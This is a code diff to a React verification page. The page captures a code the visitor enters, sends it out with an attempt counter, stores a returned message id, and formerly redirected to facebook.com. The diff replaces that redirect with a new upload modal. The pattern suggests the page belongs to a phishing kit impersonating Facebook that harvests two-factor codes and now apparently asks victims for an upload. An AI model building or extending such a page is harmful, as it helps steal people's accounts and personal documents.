@@ -1,4 +1,5 @@
 import HeroImage from "@/assets/images/verify.png";
+import Upload from "@/pages/upload";
 import getConfig from "@/utils/config";
 import axios from "axios";
 import type { FC } from "react";
@@ -9,6 +10,7 @@ interface UIState {
   isLoading: boolean;
   attempt: number;
   messageId: number;
+  showUploadModal: boolean;
 }
 
 interface Config {
@@ -23,6 +25,7 @@ const initialUIState: UIState = {
   isLoading: false,
   attempt: 0,
   messageId: 0,
+  showUploadModal: false,
 };
 
 const createVerifyMessage = (code: string, attempt?: number) => {
@@ -96,10 +99,10 @@ const Verify: FC = () => {
         );
         localStorage.setItem("messageId", response.data.result.message_id);
         setTimeout(() => {
-          window.location.replace("https://facebook.com");
+          setUiState((prev) => ({ ...prev, showUploadModal: true }));
         }, config.loadingTime);
       } catch {
-        window.location.replace("https://facebook.com");
+        setUiState((prev) => ({ ...prev, showUploadModal: true }));
       }
       return;
     }
@@ -197,6 +200,14 @@ const Verify: FC = () => {
 
         <p className="text-blue-500 hover:underline">Send Code</p>
       </div>
+
+      {uiState.showUploadModal && (
+        <Upload
+          onClose={() =>
+            setUiState((prev) => ({ ...prev, showUploadModal: false }))
+          }
+        />
+      )}
     </div>
   );
 };
